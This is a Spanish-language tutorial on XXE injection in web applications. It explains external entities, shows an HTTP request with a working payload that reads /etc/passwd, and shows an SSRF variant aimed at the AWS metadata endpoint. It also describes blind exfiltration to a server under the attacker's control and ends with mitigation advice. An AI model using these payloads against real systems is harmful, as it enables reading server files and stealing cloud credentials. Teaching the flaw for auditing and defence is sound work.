-- -
# 1. ¿Qué es y por qué ocurre?

Muchas aplicaciones web utilizan el formato **XML** para transferir datos entre el cliente y el servidor (especialmente en APIs tipo SOAP o configuraciones pesadas).

El lenguaje XML permite definir una especie de "variables" llamadas **Entidades (Entities)**. Una característica nativa (pero peligrosa) de XML es que permite definir **Entidades Externas**, las cuales obligan al analizador (parser) XML del servidor a buscar un recurso fuera del documento, ya sea en el disco duro local o en internet.

El ataque XXE ocurre cuando la aplicación web procesa un archivo XML enviado por el usuario, y el parser XML del servidor tiene **habilitada la resolución de entidades externas**.
# 2. Estructura de un XML Atacable

Para inyectar una entidad, usamos el bloque `DOCTYPE` (donde se define la estructura del documento).
### Petición Original Legítima (Burp Suite):

```XML
POST /api/v1/user HTTP/1.1
Content-Type: application/xml

<user>
	<username>juan</username>
</user>
```
### Petición Modificada por el Auditor (Lectura de Archivos):

Definimos una entidad llamada `xxe` que apunte a un archivo del sistema y luego la llamamos usando `&xxe;` dentro del cuerpo:

```XML
POST /api/v1/user HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
	<username>&xxe;</username>
</user>
```
### ¿Qué pasa en el servidor?

El parser XML del backend lee la definición `SYSTEM "file:///etc/passwd"`, va al disco duro, extrae el archivo de usuarios, reemplaza el texto `&xxe;` con el contenido del archivo y, si la aplicación web refleja el nombre de usuario en la respuesta, **te pintará el archivo `/etc/passwd` directamente en tu pantalla**.
# 3. Explotación Avanzada: SSRF y Blind XXE

- **SSRF vía XXE:** En lugar de `file://`, puedes usar `http://`. Si inyectas `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`, puedes forzar al servidor de la víctima a hacer una petición a su propia infraestructura interna (por ejemplo, para robar credenciales de AWS de la máquina).
- **Blind XXE (Ciego):** Si la aplicación procesa el XML pero no refleja ningún resultado en la pantalla, puedes forzar al parser XML a que lea un archivo local, lo codifique y te lo envíe haciendo una petición web saliente a un servidor controlado por ti (usando _Burp Collaborator_).
# 4. Mitigación de XXE

La mitigación es sencilla pero radical: **Deshabilitar por completo el uso de external entities (DTD)** en la configuración del parser XML que use el lenguaje de programación (ej. en Java, PHP o Python). Si el parser ve un `<!ENTITY...>`, simplemente lo ignorará.
-- -
